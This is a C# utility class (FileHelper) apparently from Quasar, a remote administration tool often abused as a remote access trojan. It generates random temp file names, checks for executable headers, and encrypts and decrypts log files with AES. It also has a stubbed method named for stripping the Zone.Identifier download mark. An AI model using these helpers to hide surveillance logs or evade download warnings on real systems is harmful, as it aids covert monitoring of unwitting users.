using Quasar.Common.Cryptography;
using System.IO;
using System.Linq;
using System.Text;

namespace Quasar.Common.Helpers
{
    public static class FileHelper
    {
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();

        public static bool HasIllegalCharacters(string path)
        {
            return path.Any(c => IllegalPathChars.Contains(c));
        }

        public static string GetRandomFilename(int length, string extension = "")
        {
            return string.Concat(StringHelper.GetRandomString(length), extension);
        }

        public static string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return false;
        }

        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        public static string ReadLogFile(string filename, Aes256 aes)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}
